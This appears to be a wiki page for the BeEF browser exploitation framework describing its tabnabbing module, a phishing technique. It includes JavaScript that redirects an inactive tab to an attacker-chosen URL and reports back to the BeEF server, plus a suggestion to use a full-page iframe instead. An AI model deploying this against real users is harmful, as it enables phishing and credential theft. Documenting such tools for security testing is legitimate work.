##Summary
* **Objective**: This module redirects to the specified URL after the tab has been inactive for a specified amount of time.
* **Authors**: bcoles
* **Browsers**: 1ll
* **Parameters** :
  * **URL** : URL for the redirection
  * **Wait** : Time before redirecting (in minutes)

* [Code](https://github.com/beefproject/beef/tree/master/modules/social_engineering/tabnabbing)

##Internal Working 

Internal workig is pretty easy : when the tab loose focus, it starts a timer. When the timer ends the browser is redirected to the given URL :

```javascript
window.onblur = function() {
    begin_countdown();
}

window.onfocus = function() {
    clearTimeout(tabnab_timer);
}

begin_countdown = function() {
    tabnab_timer = setTimeout(function() { beef.net.send('<%= @command_url %>', <%= @command_id %>, 'tabnab=redirected'); window.location = url; }, wait);
}
```

## Screenshots

[[Images/module-tabnabbing1.png|align=center]]

## Feedback

* One improvement may be to replace the redirection by a 100% iframe.
* It should be noticed that the time given is in minute which may be long regarding average of web sessions

## References
* "Tabnabbing: A New Type of Phishing Attack":http://www.azarask.in/blog/post/a-new-type-of-phishing-attack/ by Aza Raskin